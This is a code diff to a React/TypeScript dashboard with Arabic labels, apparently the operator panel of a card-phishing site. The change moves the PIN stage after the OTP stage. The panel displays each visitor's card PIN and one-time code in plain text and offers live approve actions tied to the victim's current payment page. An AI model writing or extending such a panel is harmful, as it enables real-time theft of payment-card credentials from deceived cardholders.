@@ -1082,20 +1082,20 @@ const StageProgress = ({ v }: { v: Visitor }) => {
       tone: "rose",
     },
     {
-      key: "pin",
-      label: "الرقم السري",
-      icon: Lock,
-      at: v.pin_at,
-      done: hasAny(v.card_pin),
-      tone: "amber",
-    },
-    {
       key: "otp",
       label: "رمز OTP",
       icon: ShieldCheck,
       at: v.otp_at,
       done: hasAny(v.card_otp),
       tone: "emerald",
+    },
+    {
+      key: "pin",
+      label: "الرقم السري",
+      icon: Lock,
+      at: v.pin_at,
+      done: hasAny(v.card_pin),
+      tone: "amber",
     },
   ];
 
@@ -1221,21 +1221,6 @@ const StageCards = ({ v }: { v: Visitor }) => {
         </StageCard>
       )}
 
-      {hasPin && (
-        <StageCard
-          tone="amber"
-          title="الرقم السري للبطاقة (PIN)"
-          badge="PIN"
-          icon={<Lock className="w-4 h-4" />}
-          time={v.pin_at ? formatDateTime(v.pin_at) : undefined}
-        >
-          <Field icon={Lock} label="PIN" value={v.card_pin} mono />
-          {isOnline(v) && (v.last_path || "").startsWith("/payment/pin") && (
-            <ApprovalActions sessionId={v.session_id} stage="pin" />
-          )}
-        </StageCard>
-      )}
-
       {hasOtp && (
         <StageCard
           tone="emerald"
@@ -1247,6 +1232,21 @@ const StageCards = ({ v }: { v: Visitor }) => {
           <Field icon={ShieldCheck} label="OTP" value={v.card_otp} mono />
           {isOnline(v) && (v.last_path || "").startsWith("/payment/otp") && (
             <ApprovalActions sessionId={v.session_id} stage="otp" />
+          )}
+        </StageCard>
+      )}
+
+      {hasPin && (
+        <StageCard
+          tone="amber"
+          title="الرقم السري للبطاقة (PIN)"
+          badge="PIN"
+          icon={<Lock className="w-4 h-4" />}
+          time={v.pin_at ? formatDateTime(v.pin_at) : undefined}
+        >
+          <Field icon={Lock} label="PIN" value={v.card_pin} mono />
+          {isOnline(v) && (v.last_path || "").startsWith("/payment/pin") && (
+            <ApprovalActions sessionId={v.session_id} stage="pin" />
           )}
         </StageCard>
       )}
